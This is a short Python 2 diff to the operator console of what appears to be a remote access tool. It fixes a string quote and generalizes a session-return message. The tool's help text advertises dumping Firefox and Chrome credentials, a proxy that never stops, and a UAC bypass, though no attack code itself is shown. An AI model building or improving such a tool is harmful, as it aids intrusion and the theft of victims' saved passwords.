@@ -181,7 +181,7 @@ class Client:
 				print " - proxy [start] - Start the always running proxy WARNING: Does not stop! Ever!"
 				print " - dumpff - Dump Firefox Credientials,"
 				print " - dumpchrome - Dump Chrome Credientials."
-				print " - isadmin - Prints whether the current process has admin privileges.
+				print " - isadmin - Prints whether the current process has admin privileges."
 				print " - bypassuac - Attempts to bypass UAC."
 			else:
 				try:
@@ -202,11 +202,11 @@ class Client:
 					self.make_prompt(data_package)
 			
 					sys.stdout.write(data_package["data"])
-					if data_package["data"].startswith("A new session with admin privileges should appear."):
-						raise Exception("Going back to handler due to bypassuac.")
+					if data_package["data"].startswith("A new session with"):
+						raise Exception("Going back to handler.")
 				
 				except Exception as e:
-						if str(e) == "Going back to handler due to bypassuac.":
+						if str(e) == "Going back to handler.":
 							print INFO + str(e)
 							break
 						print BAD + str(e)
